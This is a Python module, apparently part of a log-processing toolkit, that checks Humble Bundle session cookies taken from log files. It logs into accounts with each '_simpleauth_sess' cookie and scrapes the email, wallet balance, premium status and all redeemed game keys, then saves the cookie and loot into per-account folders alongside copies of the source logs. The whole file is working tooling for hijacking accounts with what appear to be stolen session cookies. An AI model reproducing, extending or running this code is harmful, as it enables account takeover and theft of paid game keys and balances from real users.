# -*- coding: utf-8 -*-
import re
import random
import shutil
import threading
import time
import requests
from bs4 import BeautifulSoup
import lxml
import os
import sys
import json
import StandartMethod
class humblebundle_checker():


	@staticmethod
	def create_file(create_path: str,cook: str, path: str, balanc: str, email: str, prem: bool, file: str, keys: dict):
		email = StandartMethod.StandartMetod.validate(email)
		dir_path = create_path + f"\\{email} - Balans({balanc}) - Prem({str(prem)})"
		try:
			os.mkdir(dir_path)
		except OSError as error:
			pass
		data = {
			'Path': path,
			'Cookie': cook,
			'Account Info': {
				'Email': email ,
				'Balanc': balanc,
				'Premium': prem
			}
		}
		mode = 0
		settings = StandartMethod.headless.get_settings()['Filter_settings']['Humblebundle']
		# with open(f'{dir_path}\\Keys ({len(keys)}).txt', 'a', encoding='utf-8') as file:
		# 	if str(settings["Key_record"]) == 'name:key':
		# 		mode = 1
		# 	for key,value in keys.items():
		# 		if mode == 1:
		# 			file.write(f'{key}:{value["key"]}\n')
		# 		else:
		# 			file.write(f'{value["key"]}\n')
		# 		time.sleep(0.1)
		with open(f'{dir_path}\\Keys ({len(keys)}).json', 'w', encoding='utf-8') as outfile:
			json.dump(keys, outfile, indent=4, ensure_ascii=False)
		with open(f'{dir_path}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
			json.dump(data, outfile, indent=4, ensure_ascii=False)
		valid_path = StandartMethod.StandartMetod.validate_path_log(path)
		shutil.copy(f'{file}\\{path}', f'{dir_path}\\{valid_path}')

		try:
			os.mkdir(f'{create_path}\\{settings["Full_log"]}')
		except:
			pass
		try:
			os.mkdir(f'{create_path}\\{settings["Premium_path"]}')
		except:
			pass

		path_premium_log = f'{create_path}\\{settings["Premium_path"]}\\{email} - Balans({balanc}) - Prem({str(prem)})'
		if str(settings['Filter_premium']) == str(prem):
			try:
				os.mkdir(path_premium_log)
			except:
				pass
			with open(f'{dir_path}\\Keys ({len(keys)}).json', 'w', encoding='utf-8') as outfile:
				json.dump(keys, outfile, indent=4, ensure_ascii=False)
			with open(f'{path_premium_log}\\MainInfo.json', 'w', encoding='utf-8') as outfile:
				json.dump(data, outfile, indent=4, ensure_ascii=False)
			shutil.copy(f'{file}\\{path}', f'{path_premium_log}\\{valid_path}')
		shutil.copy(f'{file}\\{path}', f'{create_path}\\{settings["Full_log"]}\\{valid_path}')

		print(f"\n[{threading.current_thread().name}] HumbleBundle Обнаружена валидная сессия\n"
			  f"[{threading.current_thread().name}] Баланс: {balanc}\n"
			  f"[{threading.current_thread().name}] Премиум: {prem}\n"
			  f"[{threading.current_thread().name}] Путь: {dir_path}")
	@staticmethod
	def checker(dict, account, path_log, file):
		headers = StandartMethod.StandartMetod.get_headers()
		cook = {
			"_simpleauth_sess": account['_simpleauth_sess'],
		}
		req = requests.get('https://www.humblebundle.com/user/wallet?hmb_source=navbar', cookies=cook, headers=headers)
		try:
			soup = BeautifulSoup(req.text, 'lxml')
			balanc = soup.find('div', class_='balance').find('div').find_all('span')[-1].text
			req = requests.get('https://www.humblebundle.com/user/settings?hmb_source=navbar', cookies=cook)
			soup = BeautifulSoup(req.text, 'lxml')
			email = soup.find('input', id="email").get('value')
			prem = True
			try:
				premium = soup.find('section', id='subscription-details').find('strong').text
				if 'не' in premium or 'non' in premium or 'not' in premium or '目前还不是会员' in premium or '不是' in premium or 'kein' in premium or 'no' in premium:
					prem = False
			except:
				pass
			req = requests.get('https://www.humblebundle.com/home/keys?hmb_source=navbar', cookies=cook)
			gamekeys = str(re.findall(r"\"gamekeys\": \[(.*?)\]", req.text)).replace('\'', '').strip('[').strip(
				']').replace('"', '').split(', ')
			count = 0
			offset = 0
			batch_size = 40
			url_list = []
			stop = False

			while True:
				for item in range(offset, offset + batch_size, 40):
					link = 'https://www.humblebundle.com/api/v1/orders?all_tpkds=true'
					offset += batch_size
					local_game = gamekeys[item:offset:]
					if local_game:
						for i in local_game:
							link += f'&gamekeys={i}'
						url_list.append(link)
					else:
						stop = True
						break
				if stop:
					break
			full_game_key = {}
			for url in url_list:
				req = requests.get(url, cookies=cook)
				game = req.json()
				for key, value in game.items():
					all_tips = value['tpkd_dict']['all_tpks']
					for tips in all_tips:
						try:
							full_game_key[tips["machine_name"]] = {'key': tips['redeemed_key_val'],
																   'key_type': tips['key_type'],
																   'is_expired': tips['is_expired']}
						except:
							pass

			humblebundle_checker.create_file(f'{dict}', account['_simpleauth_sess'], path_log, balanc, email, prem, file, full_game_key)
			time.sleep(1)
		except Exception as ex:
			pass